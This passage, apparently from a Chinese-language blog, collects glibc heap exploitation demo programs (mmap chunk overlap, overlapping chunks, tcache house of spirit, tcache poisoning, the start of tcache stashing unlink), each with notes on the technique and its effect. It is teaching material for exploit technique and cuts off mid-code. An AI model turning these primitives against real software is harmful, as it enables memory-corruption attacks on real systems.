mmaped section\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;of memory, instead of being put onto the normal heap.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;=======================================================\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating three extremely large heap chunks of size 0x100000 \n\n&quot;</span>);</span><br><span class="line">		</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* top_ptr = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The first mmap chunk goes directly above LibC: %p\n&quot;</span>,top_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// After this, all chunks are allocated downwards in memory towards the heap.</span></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* mmap_chunk_2 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The second mmap chunk goes below LibC: %p\n&quot;</span>, mmap_chunk_2);</span><br><span class="line"></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* mmap_chunk_3 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The third mmap chunk goes below the second mmap chunk: %p\n&quot;</span>, mmap_chunk_3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nCurrent System Memory Layout \n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;================================================\n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;running program\n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;heap\n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;....\n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;third mmap chunk\n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;second mmap chunk\n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;LibC\n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;....\n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;ld\n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;first mmap chunk\n&quot;</span></span><br><span class="line">           <span class="string">&quot;===============================================\n\n&quot;</span> \</span><br><span class="line">    );</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Prev Size of third mmap chunk: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="number">-2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Size of third mmap chunk: 0x%llx\n\n&quot;</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Change the size of the third mmap chunk to overlap with the second mmap chunk\n&quot;</span>);	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This will cause both chunks to be Munmapped and given back to the system\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This is where the vulnerability occurs; corrupting the size or prev_size of a chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Vulnerability!!! This could be triggered by an improper index or a buffer overflow from a chunk further below.</span></span><br><span class="line">	<span class="comment">// Additionally, this same attack can be used with the prev_size instead of the size.</span></span><br><span class="line">	mmap_chunk_3[<span class="number">-1</span>] = (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_3[<span class="number">-1</span>]) + (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_2[<span class="number">-1</span>]) | <span class="number">2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;New size of third mmap chunk: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Free the third mmap chunk, which munmaps the second and third chunks\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	This next call to free is actually just going to call munmap on the pointer we are passing it.</span></span><br><span class="line"><span class="comment">	The source code for this can be found at https://elixir.bootlin.com/glibc/glibc-2.26/source/malloc/malloc.c#L2845</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	With normal frees the data is still writable and readable (which creates a use after free on </span></span><br><span class="line"><span class="comment">	the chunk). However, when a chunk is munmapped, the memory is given back to the kernel. If this</span></span><br><span class="line"><span class="comment">	data is read or written to, the program crashes.</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	Because of this added restriction, the main goal is to get the memory back from the system</span></span><br><span class="line"><span class="comment">	to have two pointers assigned to the same location.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="comment">// Munmaps both the second and third pointers</span></span><br><span class="line">	<span class="built_in">free</span>(mmap_chunk_3); </span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	Would crash, if on the following:</span></span><br><span class="line"><span class="comment">	mmap_chunk_2[0] = 0xdeadbeef;</span></span><br><span class="line"><span class="comment">	This is because the memory would not be allocated to the current program.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Allocate a very large chunk with malloc. This needs to be larger than </span></span><br><span class="line"><span class="comment">	the previously freed chunk because the mmapthreshold has increased to 0x202000.</span></span><br><span class="line"><span class="comment">	If the allocation is not larger than the size of the largest freed mmap </span></span><br><span class="line"><span class="comment">	chunk then the allocation will happen in the normal section of heap memory.</span></span><br><span class="line"><span class="comment">	*/</span>	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Get a very large chunk from malloc to get mmapped chunk\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This should overlap over the previously munmapped/freed chunks\n&quot;</span>);</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* overlapping_chunk = <span class="built_in">malloc</span>(<span class="number">0x300000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk Ptr: %p\n&quot;</span>, overlapping_chunk);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk Ptr Size: 0x%llx\n&quot;</span>, overlapping_chunk[<span class="number">-1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Gets the distance between the two pointers.</span></span><br><span class="line">	<span class="type">int</span> distance = mmap_chunk_2 - overlapping_chunk;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Distance between new chunk and the second mmap chunk (which was munmapped): 0x%x\n&quot;</span>, distance);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Value of index 0 of mmap chunk 2 prior to write: %llx\n&quot;</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Set the value of the overlapped chunk.</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Setting the value of the overlapped chunk\n&quot;</span>);</span><br><span class="line">	overlapping_chunk[distance] = <span class="number">0x1122334455667788</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Show that the pointer has been written to.</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Second chunk value (after write): 0x%llx\n&quot;</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk value: 0x%llx\n\n&quot;</span>, overlapping_chunk[distance]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Boom! The new chunk has been overlapped with a previous mmaped chunk\n&quot;</span>);</span><br><span class="line">	assert(mmap_chunk_2[<span class="number">0</span>] == overlapping_chunk[distance]);</span><br><span class="line"></span><br><span class="line">	_exit(<span class="number">0</span>); <span class="comment">// exit early just in case we corrupted some libraries</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="overlapping-chunk"><a href="#overlapping-chunk" class="headerlink" title="overlapping_chunk"></a>overlapping_chunk</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> A simple tale of overlapping chunk.</span></span><br><span class="line"><span class="comment"> This technique is taken from</span></span><br><span class="line"><span class="comment"> http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc , <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">long</span> *p1,*p2,*p3,*p4;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nThis is another simple chunks overlapping problem\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The previous technique is killed by patch: https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;which ensures the next chunk of an unsortedbin must have prev_inuse bit unset\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;and the prev_size of it must match the unsortedbin&#x27;s size\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;This new poc uses the same primitive as the previous one. Theoretically speaking, they are the same powerful.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s start to allocate 4 chunks on the heap\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	p1 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line">	p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span> - <span class="number">8</span>);</span><br><span class="line">	p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n&quot;</span>, p1, p2, p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(p1, <span class="string">&#x27;1&#x27;</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p2, <span class="string">&#x27;2&#x27;</span>, <span class="number">0x500</span> - <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now let&#x27;s simulate an overflow that can overwrite the size of the\nchunk freed p2.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> evil_chunk_size = <span class="number">0x581</span>;</span><br><span class="line">	<span class="type">int</span> evil_region_size = <span class="number">0x580</span> - <span class="number">8</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n&quot;</span>,</span><br><span class="line">		 evil_chunk_size, evil_region_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* VULNERABILITY */</span></span><br><span class="line">	*(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the &quot;size&quot; field of chunk p2</span></span><br><span class="line">	<span class="comment">/* VULNERABILITY */</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nNow let&#x27;s free the chunk p2\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(p2);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nNow let&#x27;s allocate another chunk with a size equal to the data\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;size of the chunk p2 injected size\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This malloc will be served from the previously freed chunk that\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;is parked in the unsorted bin which size has been modified by us\n&quot;</span>);</span><br><span class="line">	p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\np4 has been allocated at %p and ends at %p\n&quot;</span>, (<span class="type">char</span> *)p4, (<span class="type">char</span> *)p4+evil_region_size);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p3 starts at %p and ends at %p\n&quot;</span>, (<span class="type">char</span> *)p3, (<span class="type">char</span> *)p3+<span class="number">0x580</span><span class="number">-8</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;</span></span><br><span class="line">		   <span class="string">&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s run through an example. Right now, we have:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nIf we memset(p4, &#x27;4&#x27;, %d), we have:\n&quot;</span>, evil_region_size);</span><br><span class="line">	<span class="built_in">memset</span>(p4, <span class="string">&#x27;4&#x27;</span>, evil_region_size);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nAnd if we then memset(p3, &#x27;3&#x27;, 80), we have:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	assert(<span class="built_in">strstr</span>((<span class="type">char</span> *)p4, (<span class="type">char</span> *)p3));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞成因-10"><a href="#漏洞成因-10" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h3 id="适用范围-10"><a href="#适用范围-10" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<h3 id="利用原理-10"><a href="#利用原理-10" class="headerlink" title="利用原理"></a>利用原理</h3><ul>
<li>申请3个chunk p1,p2,p3 对应size: 0x80 0x500 0x80</li>
<li>通过溢出修改p2的size为0x581，此时p3被包含进了p2，形成了堆重叠</li>
<li>free(p2)，p3的内存会随p2一起释放掉</li>
<li>申请 0x580-0x8 大小的chunk，即p4</li>
<li>p4实质就是p2和p3合并的chunk，我们可以通过p4对p3写内容或操作</li>
</ul>
<h3 id="相关技巧-10"><a href="#相关技巧-10" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>可以通过overlapping_chunk将一个 used chunk 合并到free chunk（也可以是topchunk）中，再将它申请出来就可以实现任意地址分配</p>
<h3 id="利用效果-10"><a href="#利用效果-10" class="headerlink" title="利用效果"></a>利用效果</h3><h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h2><p>效果：tcache_house_of_spirit就是通过free一个Fake chunk来让malloc返回一个指向几乎任意地址的指针</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the house of spirit attack on tcache.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It works in a similar way to original house of spirit but you don&#x27;t need to create fake chunk after the fake chunk that will be freed.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk&#x27;s size and prev_inuse are sane.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;(Search for strings \&quot;invalid next size\&quot; and \&quot;double free or corruption\&quot;)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Ok. Let&#x27;s start with the example!.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	<span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	assert((<span class="type">long</span>)b == (<span class="type">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>址</p>
<h3 id="漏洞成因-11"><a href="#漏洞成因-11" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h3 id="适用范围-11"><a href="#适用范围-11" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<h3 id="利用原理-11"><a href="#利用原理-11" class="headerlink" title="利用原理"></a>利用原理</h3><ul>
<li><p>这个demo演示了house of spirit在tcache上</p>
</li>
<li><p>首先malloc(1)</p>
</li>
<li><p>接着我们在栈上伪造个chunk，size为0x40。因为在tcache_put()中没有对下一个chunk的size进行检查，所以不需要伪造下一个chunk</p>
</li>
<li><p>然后我们free这个chunk，再将其申请出来即可得到伪造的chunk，若为我们还伪造了它的fd，就可以申请其他的地</p>
</li>
</ul>
<h3 id="相关技巧-11"><a href="#相关技巧-11" class="headerlink" title="相关技巧"></a>相关技巧</h3><h3 id="利用效果-11"><a href="#利用效果-11" class="headerlink" title="利用效果"></a>利用效果</h3><p>分配一个chunk到栈上</p>
<h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h2><p>效果：任意地址分配</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// disable buffering</span></span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;The attack is very similar to fastbin corruption attack.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">	b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)&amp;stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	assert((<span class="type">long</span>)&amp;stack_var == (<span class="type">long</span>)c);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞成因-12"><a href="#漏洞成因-12" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h3 id="适用范围-12"><a href="#适用范围-12" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<h3 id="利用原理-12"><a href="#利用原理-12" class="headerlink" title="利用原理"></a>利用原理</h3><p>此技巧就是通过溢出等漏洞修改tcache链表上的next指针</p>
<ul>
<li><p>我们需要tcachebin中有两个chunk，a b</p>
</li>
<li><p>free(a);free(b);</p>
</li>
<li><p>通过溢出等修改tcachebin链表头部(如b-&gt;a，b就是头部)的next指针，为&amp;stack_var</p>
</li>
<li><p>连续申请俩次就可以申请出栈上的那块内存</p>
</li>
</ul>
<h3 id="相关技巧-12"><a href="#相关技巧-12" class="headerlink" title="相关技巧"></a>相关技巧</h3><h3 id="利用效果-12"><a href="#利用效果-12" class="headerlink" title="利用效果"></a>利用效果</h3><p>任意地址分配</p>
<h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc-2.27, glibc-2.29 and glibc-2.31.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span 